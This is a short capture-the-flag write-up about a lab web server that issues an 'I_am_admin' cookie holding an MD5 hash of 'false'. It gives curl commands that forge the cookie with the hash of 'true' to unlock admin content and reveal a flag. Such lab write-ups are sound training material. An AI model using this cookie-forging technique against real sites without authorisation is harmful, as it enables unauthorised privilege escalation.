# Cookies

__curl -v -s 'http://192.168.99.101' -o out.file__

## Description
The command can send to url cookies.

## Form Outputs
Then we get the following output.
```
* Rebuilt URL to: http://192.168.99.101/
*   Trying 192.168.99.101...
* TCP_NODELAY set
* Connected to 192.168.99.101 (192.168.99.101) port 80 (#0)
> GET / HTTP/1.1
> Host: 192.168.99.101
> User-Agent: curl/7.54.0
> Accept: */*
> 
< HTTP/1.1 200 OK
< Server: nginx/1.4.6 (Ubuntu)
< Date: Mon, 18 Sep 2023 19:41:50 GMT
< Content-Type: text/html
< Transfer-Encoding: chunked
< Connection: keep-alive
< X-Powered-By: PHP/5.5.9-1ubuntu4.29
< Set-Cookie: I_am_admin=68934a3e9455fa72420237eb05902327; expires=Mon, 18-Sep-2023 20:41:50 GMT; Max-Age=3600
< 
{ [6905 bytes data]
* Connection #0 to host 192.168.99.101 left intact
```

## Flag
Let's convert [I_am_admit](#https://md5.gromweb.com/?md5=68934a3e9455fa72420237eb05902327) from md5. We get __false__. </br>
So what about __true__ ```echo -n 'true' | md5``` -> 'b326b5062b2f0e69046810717534cb09'
When wecompare the outputs with cookies true and false weget the next flag.
```
curl -s 'http://192.168.99.101' -o false.html
curl -s --cookie I_am_admin=$(echo -n 'true' | md5) 'http://192.168.99.101' -o true.html 
diff false.html true.html 
```

## Safety
We should learn about cookies and how they can be used to track user activity on a website. </br>
Specifically, you should learn how to use the curl command to send cookies to a URL and how to compare the output of two requests with different cookie values to determine if a flag is present. </br>
Additionally, you should be aware of the potential risks associated with cookies, such as the possibility of them being stolen or used for malicious purposes.